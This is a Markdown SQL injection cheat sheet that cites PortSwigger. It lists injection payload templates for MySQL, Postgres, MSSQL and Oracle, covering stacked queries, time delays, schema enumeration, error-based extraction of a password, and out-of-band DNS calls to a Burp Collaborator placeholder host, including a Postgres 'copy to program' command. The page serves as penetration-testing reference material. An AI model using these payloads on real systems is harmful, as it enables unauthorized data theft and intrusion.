# SQL Injection

<div class="grid cards" markdown>

-   __Sources__

    ---

    [:octicons-arrow-right-24: PortSwigger - SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

</div>


## String Concatenation

=== "MySQL"
    ```sql
    'foo' 'bar'
    ```
    ```sql
    CONCAT('foo', 'bar')
    ```

=== "Postgres"
    ```sql
    'foo'||'bar'
    ```

=== "MSSQL"
    ```sql
    'foo'+'bar'
    ```

=== "Oracle"
    ```sql
    'foo'||'bar'
    ```


## Substring

=== "MySQL"
    ```sql
    SUBSTRING('foobar', 2, 3)
    ```

=== "Postgres"
    ```sql
    SUBSTRING('foobar', 2, 3)
    ```

=== "MSSQL"
    ```sql
    SUBSTRING('foobar', 2, 3)
    ```

=== "Oracle"
    ```sql
    SUBSTR('foobar', 2, 3)
    ```

## Stacked Queries

=== "MySQL"
    ```sql
    QUERY-1-HERE; QUERY-2-HERE
    ```

=== "Postgres"
    ```sql
    QUERY-1-HERE; QUERY-2-HERE
    ```

=== "MSSQL"
    ```sql
    QUERY-1-HERE; QUERY-2-HERE
    ```


## Comments

=== "MySQL"
    ```sql
    -- This is a comment
    ```
    ```sql
    /* This is a comment */
    ```
    ```mysql
    # This is a comment
    ```

=== "Postgres"
    ```sql
    -- This is a comment
    ```
    ```sql
    /* This is a comment */
    ```

=== "MSSQL"
    ```sql
    -- This is a comment
    ```
    ```sql
    /* This is a comment */
    ```

=== "Oracle"
    ```sql
    -- This is a comment
    ```


## Database Version

=== "MySQL"
    ```sql
    SELECT @@version
    ```

=== "Postgres"
    ```sql
    SELECT version()
    ```

=== "MSSQL"
    ```sql
    SELECT @@VERSION
    ```

=== "Oracle"
    ```sql
    SELECT banner FROM v$version
    ```
    ```sql
    SELECT version FROM v$instance
    ```


## Time Delays

=== "MySQL"
    ```sql
    SELECT sleep(5)
    ```

=== "Postgres"
    ```sql
    SELECT pg_sleep(5)
    ```

=== "MSSQL"
    ```sql
    WAITFOR DELAY '00:00:05'
    ```

=== "Oracle"
    ```sql
    dbms_pipe.receive_message(('a'),10)
    ```


## List Tables

=== "MySQL"
    ```sql
    SELECT * FROM information_schema.tables
    ```

=== "Postgres"
    ```sql
    SELECT * FROM information_schema.tables
    ```

=== "MSSQL"
    ```sql
    SELECT * FROM information_schema.tables
    ```

=== "Oracle"
    ```sql
    SELECT * FROM all_tables
    ```


## List Columns of a Table

=== "MySQL"
    ```sql
    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
    ```

=== "Postgres"
    ```sql
    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
    ```

=== "MSSQL"
    ```sql
    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
    ```

=== "Oracle"
    ```sql
    SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
    ```


## Conditional Errors

=== "MySQL"
    ```sql
    SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
    ```

=== "Postgres"
    ```sql
    1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
    ```

=== "MSSQL"
    ```sql
    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
    ```

=== "Oracle"
    ```sql
    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
    ```


## Extracting data via visible error messages

=== "MySQL"
    ```sql
    SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
    ```

=== "Postgres"
    ```sql
    SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
    ```

=== "MSSQL"
    ```sql
     SELECT 'foo' WHERE 1 = (SELECT 'secret')
    ```


## DNS Lookup

=== "MySQL"
    > Both are Windows only

    ```sql
    LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
    ```
    ```sql
    SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
    ```

=== "Postgres"
    ```sql
    copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
    ```

=== "MSSQL"
    ```sql
    exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
    ```

=== "Oracle"
    This has been patched, but still findable:
    ```sql
    SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
    ```

    This requires elevated privileges:
    ```sql
    SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
    ```
